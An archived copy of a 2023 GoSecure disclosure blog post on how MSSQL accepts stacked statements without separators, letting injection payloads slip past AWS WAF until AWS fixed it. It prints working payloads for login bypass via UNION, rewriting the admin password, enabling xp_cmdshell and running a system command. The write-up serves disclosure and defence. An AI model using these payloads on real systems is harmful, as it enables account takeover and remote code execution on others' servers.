---
type: Article
title: AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice
description: "MSSQL accepts stacked statements with no semicolon and no whitespace between them, which AWS WAF's SQL parser treated as invalid and let through. Appending an exec() payload to an injectable parameter bypassed the WAF for UNION-based login bypass, password rewrites and enabling xp_cmdshell for remote code execution. Microsoft called the parsing by design; AWS fixed the WAF."
resource: "https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/"
tags: [article, webseclist-reference, en, gosecure, sqli, waf-bypass, mssql, parser-differential, filter-bypass, rce, auth-bypass, aws, waf, owasp-a01-2021, owasp-a03-2021, owasp-a05-2021]
generated:
  by: webseclist-refs/1
  at: "2026-08-14T20:23:24+00:00"
status: stable
stale_after: 2027-08-14
sources:
  - id: original
    resource: "https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/"
    title: AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice
    author: Marc Olivier Bergeron, @GoSecure_Inc
    last_modified: 2023-06-21
  - id: capture
    resource: "https://web.archive.org/web/20231006124547/https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/"
also_at: []
authors:
  - Marc Olivier Bergeron
  - "@GoSecure_Inc"
canonical_url: ""
cited_by:
  - "2023.md:38"
commit: ""
content_sha256: c7c93cdaa12c17ad4952780f6499938dcdfa5e588f86de3df5e581656589143c
depth: full
depth_reason: default
kind: article
language: en
licence: unknown
original_url: "https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/"
published: 2023-06-21
publisher: GoSecure
publisher_english: ""
raw_sha256: b0621cb495938c631e303e5c52b780e867c62dfa630523c08b782a85247cabdc
retrieved_from: "https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/"
retrieved_kind: stored
retrieved_utc: "2026-08-14T20:23:24+00:00"
slug: 2023-gosecure-aws-waf-clients-left-vulnerable-sql-injection-due-choice
snapshot: 20231006124547
title_english: ""
translation_file: ""
translation_of: ""
---

# AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice

**AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice** - Marc Olivier Bergeron, @GoSecure_Inc, GoSecure.

- Published: 2023-06-21
- Original: <https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/>
- Preserved from: https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/ (stored) on 2026-08-14
- Capture timestamp: 20231006124547
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

# AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice

 by [Marc Olivier Bergeron](https://www.gosecure.net/blog/author/marc-olivier-bergeron/) | Jun 21, 2023

While doing research on Microsoft SQL (MSSQL) Server, a GoSecure ethical hacker found an unorthodox design choice that ultimately led to a web application firewall (WAF) bypass.

### In a nutshell

[![MSSQL Server inside AWS WAF crosshair](https://gosecure.wpenginepowered.com/wp-content/uploads/1-sql-server-300x169.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/1-sql-server.png)An undocumented design choice in MSSQL caused Web Application Firewall (WAF) vendors to be overly strict in what it will consider SQL. These [types of problems](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/) allow a bypass of the security protection provided by WAFs. This specific confusion is caused by Microsoft, since their SQL engine is loose in what it accepts. However, it is now up to the WAF vendors to re-implement that lax attitude in their SQL parsers. This specific issue has been remediated by AWS since we notified them. Read on for all the gory details.

### The discovery

Late last year, we were playing with MSSQL to better understand how a time-based injection worked, as the cheat sheets are not always clear on why it works that way. Doing so, we were confused when the following statement worked:

```sql
SELECT * FROM test WHERE id = 1 WAITFOR DELAY'0:0:5'

```

Without any kind of termination at the end of the query, the database waited for five seconds and then yielded the results without any kind of error. At first, we thought that the WAITFOR could be a valid keyword in a SELECT query, but it is not. Then, we went a bit further by running two queries back-to-back and obtaining both results separately:

[![SQL queries one after the other](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_1.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_1.png)

If we look at what happened in the SQL Server Profiler, we can see that each statement was completed individually even though they were sent in the same batch without any termination in between to split them:

[![SQL Profiler Output](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_2.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_2.png)

Knowing this, we pursued our exploration. We decided to write multiple SQL statements back-to-back without any space:

[![Three SQL queries back to back](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_3.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_3.png)

[![The three queries visible in SQL profiler](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_4.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/basics_4.png)

Then, we wondered if it was possible to do this with other statements than SELECT. Additionally, is it possible without any kind of space or known space replacements, such as inline comments? The answer is yes, except for statements that require a space in between reserved keywords. For instance, CREATE TABLE or ALTER TABLE still needs some space between the two reserved keywords. Otherwise, the following image shows that it was possible to change the database context, create a table, insert data in the table, select the data from the table and drop the table:

[![A long query in SQL profiler without any whitespace](https://gosecure.wpenginepowered.com/wp-content/uploads/mssql.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/mssql.png)

The batch of statements above was:

```sql
use[tempdb]create/**/table[test]([id]int)insert[test]values(1)select[id]from[test]drop/**/table[test]
```

Which is the equivalent of the following:

```sql
use [tempdb]
create table [test] ([id] int)
insert [test] values(1)
select [id] from [test]
drop table[test]
```

With all this information, we had to wonder, is this publicly known? Is this by design or a bug? Who else knows about this? And could it be used to bypass web application firewalls (WAFs)?

### A Review of What Is Publicly Known

After some research; looking at Microsoft’s documentation on MSSQL, testers’ cheat sheets on MSSQL injection, etc., we had to conclude that this was unknown to the public and that it could potentially be an unintentional bug in MSSQL.

Taken from the [official Microsoft’s documentation on SQL injection](https://learn.microsoft.com/en-us/sql/relational-databases/security/sql-injection?view=sql-server-ver16), it says that “the semicolon (;) denotes the end of one query and the start of another.”:

[![Highlighted Microsoft documentation](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_1.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_1.png)

From the same documentation, it also states that as a developer you can reject some characters to avoid SQL injection, which includes the semicolon again:

[![Screenshot from Microsoft's documentation](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_2.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_2.png)

The following was taken from another [Microsoft’s documentation that is named Transact-SQL syntax conventions](https://learn.microsoft.com/en-us/sql/t-sql/language-elements/transact-sql-syntax-conventions-transact-sql?view=sql-server-ver16). According to this documentation, semicolons are only mandatory in some cases and will be mandatory in a future version. However, it does not state how to terminate a statement if the semicolon is not present.

[![More Microsoft documentation](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_3.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_3.png)

We often see scripts that contain multiple statements without a semicolon but instead contain a line break and a GO statement. We assumed that the only way to run multiple statements on the same line was with a semicolon, with an IF, BEGIN, CASE WHEN, or other conditional statements. As much as this assumption was correct in a way, it is also possible to use it with many other statements.

Then, according to multiple testers’ cheat sheets, the only way to achieve stacking queries is with a semicolon delimiter:

[![Documentation about stacking SQL queries](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_4.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_4.png)

[https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#StackedSamples](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#StackedSamples)

[![PortSwigger's documentation about batched queries](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_5.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_5.png)

[https://portswigger.net/web-security/sql-injection/cheat-sheet#batched-or-stacked-queries](https://portswigger.net/web-security/sql-injection/cheat-sheet#batched-or-stacked-queries)

[![PayloadAllTheThings' documentation about MSSQL stacked queries](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_6.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/delimiter_6.png)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-stacked-query](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md#mssql-stacked-query)

The closest that we have seen of stacked queries without delimiters was in the Microsoft documentation saying that the semicolon is not required for most statements. It remains unclear what else can be done. Most other examples being conditional injections like:

```sql
IF (SELECT 1) = 1 WAITFOR DELAY '0:0:5' ELSE SELECT 0 END
```

### Bug or Feature?

Our finding will be surprising to most database administrators and developers and, accordingly, should be considered a separate issue than conditional injections. We therefore decided to report it to Microsoft to ensure it was not an unintended bug before disclosing this to any other third-party company, like a company that makes a WAF that could be bypassed with this. We submitted the report on January 6th, 2023, and received a reply on February 11th stating that “We determined that this behavior is considered to be by design.”

There you have it, the answer to the question “bug or feature?”. We now know that it is in fact by design. But what can be done on WAFs with this? Are they aware of such a *feature*?

### Abusing the bug to bypass AWS Web Application Firewall (WAF)

At first, we tried to bypass the AWS WAF without using any query termination like the semicolon and without space, or known substitute, if possible. But our efforts did not seem to work with the usual keywords like “UPDATE”, “INSERT”, “DELETE”, “SELECT”, etc. Suddenly, we got through the WAF by using the “EXEC” keyword. This means that it was possible to do almost anything from there including bypassing logins with “UNION SELECT”, updating data like a user’s password with “UPDATE” or even enabling “xp_cmdshell” to gain remote code execution.

The following example shows that the password of the user “admin” was not “testtest123” since the application responded with “Wrong password”:

[![Vulnerable application in a sane state](https://gosecure.wpenginepowered.com/wp-content/uploads/auth_bypass_wrong.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/auth_bypass_wrong.png)

But what if we used the “UNION SELECT” keyword to set our own administrator with our own password? The WAF would block this request originally, but what if it thinks that the query is invalid because of the “EXEC” keyword at the end without any termination? It is to be noted that the first part of the query was meant to be false so that the only data returned by this query is the data in the union and that explains the typo in the “admina” username.

[![Vulnerable application successfully injected](https://gosecure.wpenginepowered.com/wp-content/uploads/auth_bypass_success.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/auth_bypass_success.png)

The query submitted:

```sql
admina'union select 1,'admin','testtest123'exec('select 1')--
```

It worked because, in theory, the batch of queries is valid in MSSQL and won’t have any error to it. In MSSQL, the batch would be split into two different queries that would look like this:

```sql
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'
```

Our goal was to bypass the restrictions of the WAF by making it believe that the query was invalid so that it will not block it. Meaning that the additional “EXEC” keyword was there only for that purpose. It is to be noted that the second query would still run on the server, but the result would not be accessible by the web application. Therefore, the “SELECT” keyword is only there to bypass the WAF, but there are other interesting ways to use this feature, such as data modification.

As previously mentioned, it is not possible to directly use the keywords that are used to modify data, but what if we use them with the “EXEC” keyword just like we did above with the “SELECT”? The following image shows that the browser is using AWS CloudFront and that the authentication was successful. Note that the authentication was only successful because the password was “admin” before the “UPDATE” occurred. The middle of the image displays the Apache logs showing that the username parameter contained the malicious payload that is going to modify the password of the user “admin” to the letter “a”. Finally, the bottom section of the image shows that the password was modified in the database to the letter “a”.

[![Demonstration of a successful injection in our vulnerable demo application](https://gosecure.wpenginepowered.com/wp-content/uploads/update_password.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/update_password.png)

The payload was:

```sql
admin'exec('update[users]set[password]=''a''')--
```

Which, again, will be split into two (2) distinct statements that will do the following:

```sql
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'
```

What else could be done with this bypass? Remember when we mentioned enabling “xp_cmdshell” and obtaining remote code execution? The following image shows that we successfully enabled “show advanced option” and “xp_cmdshell” with one HTTP request. The top of the image displays the batch being split into multiple statements in SQL Server Profiler. The middle displays the browser requesting on AWS CloudFront with part of the payload. The bottom part displays that “show advanced option” and “xp_cmdshell” are now enabled.

[![xp_cmdshell on MSSQL](https://gosecure.wpenginepowered.com/wp-content/uploads/rce_set_advanced_options_on.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/rce_set_advanced_options_on.png)

The payload was:

```sql
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

What was executed on the database server:

```sql
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
```

We then used the same technique to execute “xp_cmdshell” and obtain remote code execution on the system with:

[![An example of Remote Code Execution (RCE) payload](https://gosecure.wpenginepowered.com/wp-content/uploads/rce1.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/rce1.png)

[![The consequence of the RCE. We can see that the code was executed.](https://gosecure.wpenginepowered.com/wp-content/uploads/rce2.png)](https://gosecure.wpenginepowered.com/wp-content/uploads/rce2.png)

The payload was:

```sql
admin'exec('xp_cmdshell''echo "This is a test!" > C:\Temp\test.txt''')--
```

What was executed on the database server:

```sql
select * from users where username = 'admin'
exec('xp_cmdshell''echo "This is a test!" > C:\Temp\test.txt''')--
```

There you have it, remote code execution on a MSSQL server protected by AWS WAF. But what about other WAFs? We tried to bypass Azure’s WAF and ModSecurity without success. There is one thing to note for developers that use ModSecurity with libinjection: with this technique, we achieved an anomaly score of 5 at paranoia level 1. Therefore if you modified the anomaly score to be higher, you could be vulnerable to this technique.

### Design Choice with Security Implications

The real problem in this story is the lack of documentation about this design choice, not the feature itself. Had it been documented properly and transparently, WAF developers would be able to better and more efficiently protect themselves. This design choice is simply unusual if compared with other popular SQL databases and improper documentation is what makes it a problem.

### Timeline

- 2022-11-03: *Feature *discovered while doing MSSQL research.
- 2023-01-06: Reporting it as a security bug to Microsoft’s Security Response Center.
- 2023-02-11: Response from Microsoft stating that this is by design and not a security issue.
- 2023-02-14: Reporting the WAF bypass to the AWS security team by email.
- 2023-02-15: Response from AWS saying that they will investigate the matter.
- 2023-03-13: Response from AWS saying that they are working on a fix.
- 2023-06-15: Response from AWS saying that it is now fixed.
- 2023-06-19: We confirmed the fix.

### Conclusion

Unlike many security issues, this is merely a design choice that was unorthodox and undocumented. This design choice has left AWS WAF clients unprotected to MSSQL injection attacks using this specific issue. Fortunately, AWS was responsive and had great communication with our team to ensure the WAF was properly protecting clients against this issue.
